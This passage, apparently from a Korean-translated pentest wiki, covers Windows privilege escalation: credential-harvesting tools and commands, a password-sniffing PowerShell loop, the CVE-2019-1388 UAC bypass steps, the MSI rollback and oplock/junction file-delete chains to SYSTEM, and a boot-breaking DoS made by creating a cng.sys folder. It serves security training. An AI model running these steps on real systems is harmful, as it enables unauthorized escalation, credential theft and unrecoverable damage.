[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf 플러그인입니다**. 저는 이 플러그인을 만들어 피해 시스템 내부에서 **자격 증명을 검색하는 모든 metasploit POST module을 자동으로 실행**하도록 했습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 이 페이지에서 언급된 비밀번호를 포함한 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 은 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

이 도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 이 데이터를 clear text로 저장하는 여러 도구 (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)의 **sessions**, **usernames** 및 **passwords**를 검색합니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

공유 메모리 세그먼트, 일반적으로 pipes라 불리는 것들은 프로세스 간 통신과 데이터 전송을 가능하게 한다.

Windows는 Named Pipes라는 기능을 제공하여 관련 없는 프로세스들조차(심지어 다른 네트워크에 걸쳐서도) 데이터를 공유할 수 있게 한다. 이는 client/server 아키텍처와 유사하며, 역할은 named pipe server와 named pipe client로 정의된다.

클라이언트가 pipe를 통해 데이터를 보낼 때, 해당 pipe를 설정한 서버는 필요한 `SeImpersonate` 권한이 있다면 클라이언트의 신원을 가장(impersonate)할 수 있다. 당신이 만든 파이프와 상호작용하는 권한 있는 프로세스를 식별하고 이를 가장할 수 있다면, 해당 프로세스의 신원을 취함으로써 더 높은 권한을 획득할 기회를 얻는다. 이러한 공격을 실행하는 방법에 대한 지침은 [**여기**](named-pipe-client-impersonation.md) 및 [**여기**](#from-high-integrity-to-system)에서 확인할 수 있다.

또한 다음 도구는 burp 같은 도구로 named pipe 통신을 가로챌 수 있게 해준다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 권한 상승(privesc)을 찾기 위해 모든 파이프를 나열하고 볼 수 있게 해준다:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 기타

### Windows에서 코드를 실행할 수 있는 파일 확장자

페이지를 확인해보라: **[https://filesec.io/](https://filesec.io/)**

### **명령줄에서 비밀번호 모니터링**

사용자 권한으로 쉘을 얻으면, 스케줄된 작업이나 다른 프로세스들이 명령줄에 자격 증명을 전달하면서 실행될 수 있다. 아래 스크립트는 2초마다 프로세스의 명령줄을 캡처하고 현재 상태를 이전 상태와 비교하여 차이점을 출력한다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스에 (via console or RDP) 접근할 수 있고 UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로도 "NT\AUTHORITY SYSTEM"과 같은 터미널이나 다른 프로세스를 실행할 수 있습니다.

이로 인해 동일한 취약점으로 권한 상승과 UAC 우회를 동시에 실행할 수 있습니다. 또한 아무것도 설치할 필요가 없고, 과정에서 사용되는 바이너리는 Microsoft에 의해 서명되고 발급됩니다.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

이 항목을 읽어 **Integrity Levels**에 대해 학습하세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그런 다음 **UAC와 UAC 우회**에 대해 학습하려면 다음을 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

이 블로그 포스트에 설명된 기술([**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks))과 익스플로잇 코드([**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs))를 참고하세요.

공격은 기본적으로 Windows Installer의 rollback 기능을 악용해 정당한 파일을 제거(또는 교체)하는 동안 악성 파일로 대체하는 방식입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 하이재킹하는 데 사용할 **악성 MSI installer**를 만들어야 하며, 이 폴더는 나중에 다른 MSI 패키지의 제거(uninstallation) 중에 rollback 파일을 저장하기 위해 Windows Installer가 사용하게 됩니다. 이 rollback 파일들이 악성 페이로드를 포함하도록 조작됩니다.

요약된 기법은 다음과 같습니다:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Writable 폴더(`TARGETDIR`)에 무해한 파일(e.g., `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
- 인스톨러를 **"UAC Compliant"**로 표시하여 **non-admin user**도 실행할 수 있게 합니다.
- 설치 후 파일에 대한 **handle**을 열어 둡니다.

- Step 2: Begin Uninstall
- 동일한 `.msi`를 언인스톨합니다.
- 언인스톨 과정에서 파일들이 `C:\Config.Msi`로 이동되고 `.rbf` 파일로 이름이 바뀝니다(rollback backups).
- 파일이 `C:\Config.Msi\<random>.rbf`가 되었는지 감지하기 위해 `GetFinalPathNameByHandle`을 사용해 **open file handle을 폴링**합니다.

- Step 3: Custom Syncing
- `.msi`는 **custom uninstall action (`SyncOnRbfWritten`)**을 포함하여:
- `.rbf`가 작성되었음을 신호(signal)하고,
- 언인스톨을 계속하기 전에 다른 이벤트를 **대기**합니다.

- Step 4: Block Deletion of `.rbf`
- 신호를 받으면 `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 **열어둡니다** — 이렇게 하면 해당 파일을 **삭제하지 못하게** 합니다.
- 그런 다음 언인스톨이 종료되도록 **신호를 되돌려 줍니다**.
- Windows Installer는 `.rbf`를 삭제하지 못해 `C:\Config.Msi`의 모든 내용을 삭제하지 못하고, 결과적으로 **`C:\Config.Msi`는 제거되지 않습니다**.

- Step 5: Manually Delete `.rbf`
- 공격자는 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`는 비어 있으며**, 하이재킹할 준비가 되었습니다.

> 이 시점에서, **SYSTEM-level arbitrary folder delete 취약점**을 트리거해 `C:\Config.Msi`를 삭제하세요.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- `C:\Config.Msi` 폴더를 재생성합니다.
- **약한 DACL**(예: Everyone:F)을 설정하고, `WRITE_DAC` 권한으로 **handle을 열어 둡니다**.

- Step 7: Run Another Install
- `.msi`를 다시 설치합니다. 이때:
- `TARGETDIR`: 쓰기 가능한 위치로 설정.
- `ERROROUT`: 강제 실패를 유발하는 변수로 설정.
- 이 설치는 다시 **rollback**을 트리거하기 위해 사용되며, rollback은 `.rbs`와 `.rbf`를 읽습니다.

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하고 새 `.rbs`가 나타날 때까지 기다립니다.
- 해당 파일 이름을 캡처합니다.

- Step 9: Sync Before Rollback
- `.msi`는 **custom install action (`SyncBeforeRollback`)**을 포함하여:
- `.rbs`가 생성되었을 때 이벤트를 신호하고,
- 계속하기 전에 **대기**합니다.

- Step 10: Reapply Weak ACL
- `.rbs created` 이벤트를 받은 후:
- Windows Installer가 `C:\Config.Msi`에 대해 **강한 ACL을 다시 적용**합니다.
- 하지만 당신은 `WRITE_DAC`를 가진 handle을 여전히 가지고 있으므로 **약한 ACL을 다시 적용**할 수 있습니다.

> ACL은 **handle이 열릴 때만 적용**되므로, 여전히 폴더에 쓸 수 있습니다.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` 파일을 덮어써서 **가짜 rollback 스크립트**를 넣고, Windows가 다음을 수행하도록 합니다:
- 귀하의 `.rbf`(악성 DLL)를 **권한이 있는 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)로 복원하도록 지시.
- 악성 SYSTEM 수준 페이로드 DLL을 포함한 가짜 `.rbf`를 놓습니다.

- Step 12: Trigger the Rollback
- 동기화 이벤트를 신호하여 인스톨러가 재개되도록 합니다.
- 알려진 시점에서 설치를 **의도적으로 실패시키는 type 19 custom action (`ErrorOut`)**가 구성되어 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer는:
- 당신의 악성 `.rbs`를 읽고,
- 대상 위치로 당신의 `.rbf` DLL을 복사합니다.
- 이제 **SYSTEM이 로드하는 경로에 악성 DLL이 설치**됩니다.

- Final Step: Execute SYSTEM Code
- 신뢰되는 **auto-elevated binary**(예: `osk.exe`)를 실행하여 하이재킹한 DLL을 로드하게 합니다.
- **성공**: 당신의 코드가 **SYSTEM 권한으로 실행**됩니다.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

주요 MSI rollback 기법(앞의 방법)은 전체 폴더(e.g., `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 하지만 취약점이 **임의의 파일 삭제**만 허용한다면 어떻게 할까요?

이 경우 NTFS 내부 구조를 악용할 수 있습니다: 모든 폴더에는 숨겨진 대체 데이터 스트림(alternate data stream)이 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **인덱스 메타데이터**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면**, NTFS는 파일 시스템에서 **폴더 전체를 제거합니다**.

이 작업은 표준 파일 삭제 APIs를 사용하여 다음과 같이 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 비록 *파일* 삭제 API를 호출하고 있어도, 그것은 **폴더 자체를 삭제합니다**.

### From Folder Contents Delete to SYSTEM EoP
만약 primitive가 임의의 파일/폴더를 삭제할 수 없더라도, 그것이 **공격자가 제어하는 폴더의 *내용물* 삭제를 허용한다면 어떻게 될까요?**

1. Step 1: Setup a bait folder and file
- 생성: `C:\temp\folder1`
- 그 안에: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- 해당 oplock은 권한 있는 프로세스가 `file1.txt`를 삭제하려 할 때 **실행을 일시중지합니다**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 3단계: SYSTEM 프로세스 트리거(예: `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 스캔하고 그 안의 내용을 삭제하려고 시도합니다.
- 프로세스가 `file1.txt`에 도달하면 **oplock triggers**가 발생하여 제어를 콜백으로 넘깁니다.

4. 4단계: oplock 콜백 내부 – 삭제를 리디렉션

- 옵션 A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 `folder1`을 비울 수 있지만 oplock은 깨지지 않습니다.
- `file1.txt`를 직접 삭제하지 마세요 — 그렇게 하면 oplock이 조기에 해제됩니다.

- 옵션 B: `folder1`를 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 옵션 C: `\RPC Control`에 **symlink** 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이것은 폴더 메타데이터를 저장하는 NTFS 내부 stream을 대상으로 합니다 — 이를 삭제하면 폴더가 삭제됩니다.

5. 5단계: oplock 해제
- SYSTEM 프로세스가 계속 진행되며 `file1.txt`를 삭제하려고 시도합니다.
- 그러나 이제 junction + symlink 때문에, 실제로 삭제하고 있는 것은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### From Arbitrary Folder Create to Permanent DoS

primitive를 이용하면 **SYSTEM/admin 권한으로 임의의 folder를 생성할 수 있습니다** — 심지어 **파일을 쓸 수 없거나** 또는 **약한 권한을 설정할 수 없는 경우에도**.

**critical Windows driver**의 이름으로 **folder** (not a file)를 생성하세요. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 일반적으로 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 만약 이 경로를 **폴더로 미리 생성**하면, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면 Windows는 부팅 중에 `cng.sys`를 로드하려 시도합니다.
- 폴더를 발견하면 실제 드라이버를 **해결하지 못하고**, **충돌하거나 부팅이 중단**됩니다.
- 외부 개입(예: 부팅 복구나 디스크 접근) 없이는 **대체 수단이 없으며**, **복구할 수 없습니다**.


## **High Integrity에서 System으로**

### **새 서비스**

이미 High Integrity 프로세스에서 실행 중이라면, **SYSTEM으로 가는 경로**는 단지 **새 서비스를 생성하고 실행하는 것**으로 쉽게 얻을 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 서비스 바이너리를 만들 때, 그것이 유효한 service인지 또는 바이너리가 필요한 동작을 신속히 수행하는지 확인하세요. 유효한 service가 아니면 20초 내에 종료됩니다.

### AlwaysInstallElevated

High Integrity 프로세스에서 AlwaysInstallElevated 레지스트리 항목을 활성화하고 _.msi_ 래퍼를 사용해 리버스 셸을 설치해 볼 수 있습니다.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**당신은** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

해당 token 권한이 있다면(대부분 이미 High Integrity 프로세스에서 발견됩니다), SeDebug 권한으로 거의 모든 프로세스(보호된 프로세스 제외)를 열고, 프로세스의 token을 복사하여 그 token으로 임의의 프로세스를 생성할 수 있습니다.\
이 기법을 사용할 때는 보통 모든 token 권한을 가진 SYSTEM으로 실행 중인 프로세스를 선택합니다(예, 모든 token 권한이 없는 SYSTEM 프로세스도 존재합니다).\
**다음에서 제안된 기법을 실행하는 코드 예제를 확인할 수 있습니다** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기법은 meterpreter가 getsystem으로 권한 상승할 때 사용합니다. 이 기법은 파이프를 생성한 다음 해당 파이프에 쓰기 위해 service를 생성하거나 악용하는 방식으로 구성됩니다. 그런 다음, SeImpersonate 권한을 사용해 파이프를 생성한 서버는 파이프 클라이언트(서비스)의 token을 impersonate하여 SYSTEM 권한을 얻을 수 있습니다.\
만약 이름 기반 파이프에 대해 더 알고 싶다면 [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)을 읽어보세요.\
High Integrity에서 이름 기반 파이프를 사용해 System으로 상승하는 예제를 읽고 싶다면 [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)을 참조하세요.

### Dll Hijacking

SYSTEM으로 실행되는 프로세스가 로드하는 dll을 hijack할 수 있다면, 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 종류의 권한 상승에 유용하며, 특히 high integrity 프로세스는 dll을 로드하는 폴더에 대한 쓰기 권한을 가지고 있으므로 달성하기 훨씬 쉽습니다.\
**다음에서 Dll hijacking에 대해 더 알아볼 수 있습니다** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**읽기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 추가 도움말

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 유용한 도구

**로컬 권한 상승 벡터를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 설정 및 민감한 파일을 검사합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 탐지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 잘못된 설정을 검사하고 정보를 수집합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 잘못된 설정 검사**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP 저장 세션 정보를 추출합니다. 로컬에서 -Thorough 옵션 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 자격 증명을 추출합니다. 탐지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 비밀번호를 도메인 전역에 스프레이합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell 기반 ADIDNS/LLMNR/mDNS/NBNS 스푸퍼 및 중간자 공격 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 Windows 권한 상승 열거 도구**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 권한 상승 취약점을 검색합니다 (Watson으로 대체되어 DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(Admin 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 권한 상승 취약점을 검색합니다 (VisualStudio로 컴파일 필요) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfiguration을 찾기 위해 호스트를 열거합니다 (권한 상승보다는 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 다양한 소프트웨어에서 자격 증명을 추출합니다 (GitHub에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 잘못된 설정 검사 (GitHub에 실행 파일 존재). 권장하지 않음. Win10에서 잘 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 잘못된 설정 검사 (python으로 만든 exe). 권장하지 않음. Win10에서 잘 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 만든 도구(정확히 작동하려면 accesschk가 필요하지 않지만 사용할 수 있음).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력물을 읽어 작동 가능한 익스플로잇을 추천합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력물을 읽어 작동 가능한 익스플로잇을 추천합니다 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

프로젝트는 올바른 버전의 .NET을 사용해 컴파일해야 합니다 ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 호스트에 설치된 .NET 버전을 확인하려면 다음을 수행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 참고 자료

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
